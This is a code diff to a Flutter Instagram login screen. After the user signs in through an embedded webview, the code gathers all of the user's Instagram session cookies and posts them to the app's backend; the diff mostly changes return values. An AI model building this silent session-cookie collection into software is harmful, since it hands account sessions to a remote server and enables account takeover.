@@ -18,66 +18,82 @@ class _InstagramLoginState extends State<InstagramLogin> {
 
   @override
   Widget build(BuildContext context) {
-    return Scaffold(
-      appBar: AppBar(title: Text("Instagram Login")),
-      body: InAppWebView(
-        initialUrlRequest: URLRequest(
-          url: WebUri("https://www.instagram.com/accounts/login/"),
-        ),
-        initialOptions: InAppWebViewGroupOptions(
-          crossPlatform: InAppWebViewOptions(
-            cacheEnabled: false,
+    return WillPopScope(
+      onWillPop: () async {
+        // Return false when the user presses the back button or closes the screen
+        Navigator.pop(context, false);
+        return true; // Allow the back navigation to proceed
+      },
+      child: Scaffold(
+        appBar: AppBar(title: Text("Instagram Login")),
+        body: InAppWebView(
+          initialUrlRequest: URLRequest(
+            url: WebUri("https://www.instagram.com/accounts/login/"),
           ),
-          android: AndroidInAppWebViewOptions(
-            useHybridComposition: true,
+          initialOptions: InAppWebViewGroupOptions(
+            crossPlatform: InAppWebViewOptions(
+              cacheEnabled: false,
+            ),
+            android: AndroidInAppWebViewOptions(
+              useHybridComposition: true,
+            ),
+            ios: IOSInAppWebViewOptions(
+              allowsInlineMediaPlayback: true,
+            ),
           ),
-          ios: IOSInAppWebViewOptions(
-            allowsInlineMediaPlayback: true,
-          ),
-        ),
-        onWebViewCreated: (controller) {
-          webViewController = controller;
-          clearCookiesAndCache();
-        },
-        onLoadStop: (controller, url) async {
-          try {
-            // Add a delay to ensure the page is fully loaded
-            await Future.delayed(Duration(seconds: 6));
+          onWebViewCreated: (controller) {
+            webViewController = controller;
+            clearCookiesAndCache();
+          },
+          onLoadStop: (controller, url) async {
+            try {
+              // Add a delay to ensure the page is fully loaded
+              await Future.delayed(Duration(seconds: 6));
 
-            // Get all cookies associated with the Instagram domain
-            CookieManager cookieManager = CookieManager.instance();
-            List<Cookie> cookies = await cookieManager.getCookies(url: url!);
+              // Get all cookies associated with the Instagram domain
+              CookieManager cookieManager = CookieManager.instance();
+              List<Cookie> cookies = await cookieManager.getCookies(url: url!);
 
-            // Check if the 'ds_user_id' cookie is present (indicating the user is logged in)
-            bool isLoggedIn =
-                cookies.any((cookie) => cookie.name == 'ds_user_id');
+              // Check if the 'ds_user_id' cookie is present (indicating the user is logged in)
+              bool isLoggedIn =
+                  cookies.any((cookie) => cookie.name == 'ds_user_id');
 
-            if (isLoggedIn) {
-              // User is logged in, proceed with your actions
-              Map<String, String> cookieData = {};
-              for (var cookie in cookies) {
-                cookieData[cookie.name] = cookie.value;
-              }
-
-              if (cookieData.isNotEmpty) {
-                await saveUserData(cookieData);
-                await scrapeXIgAppId();
-                await sendCookies(cookieData);
-
-                if (mounted) {
-                  Navigator.of(context).pop();
+              if (isLoggedIn) {
+                // User is logged in, proceed with your actions
+                Map<String, String> cookieData = {};
+                for (var cookie in cookies) {
+                  cookieData[cookie.name] = cookie.value;
                 }
+
+                if (cookieData.isNotEmpty) {
+                  await saveUserData(cookieData);
+                  await scrapeXIgAppId();
+
+                  // Send cookies and check if successful
+                  bool success = await sendCookies(cookieData);
+
+                  if (success) {
+                    print("Cookies sent successfully!");
+                    Navigator.pop(context, true);  // Return true to indicate success
+                  } else {
+                    print("Failed to send cookies.");
+                    Navigator.pop(context, false);  // Return false to indicate failure
+                  }
+                }
+              } else {
+                print("User is not logged in yet.");
+                Navigator.pop(context, false);  // Return false if user is not logged in
               }
-            } else {
-              print("User is not logged in yet.");
+            } catch (e) {
+              print("Error checking login status: $e");
+              Navigator.pop(context, false);  // Return false on error
             }
-          } catch (e) {
-            print("Error checking login status: $e");
-          }
-        },
+          },
+        ),
       ),
     );
   }
+
 
   Future<void> clearCookiesAndCache() async {
     CookieManager cookieManager = CookieManager.instance();
@@ -92,13 +108,13 @@ class _InstagramLoginState extends State<InstagramLogin> {
     print("Cookies saved: $jsonCookies");
   }
 
-  Future<void> sendCookies(Map<String, String> cookies) async {
+  Future<bool> sendCookies(Map<String, String> cookies) async {
     try {
       String? accessToken = await _storage.read(key: 'access_token');
 
       if (accessToken == null || accessToken.isEmpty) {
         print("Access token is null or empty.");
-        return;
+        return false;
       }
 
       Uri apiUrl = Uri.parse("${AppConfig.baseUrl}api/data/");
@@ -120,13 +136,17 @@ class _InstagramLoginState extends State<InstagramLogin> {
 
       if (response.statusCode == 200) {
         print("Cookies and x_ig_app_id sent successfully!");
+        return true;
       } else {
         print("Failed to send data. Status code: ${response.statusCode}");
+        return false;
       }
     } catch (e) {
       print("Error sending cookies via request: $e");
+      return false;
     }
   }
+
 
   Future<void> scrapeXIgAppId() async {
     try {
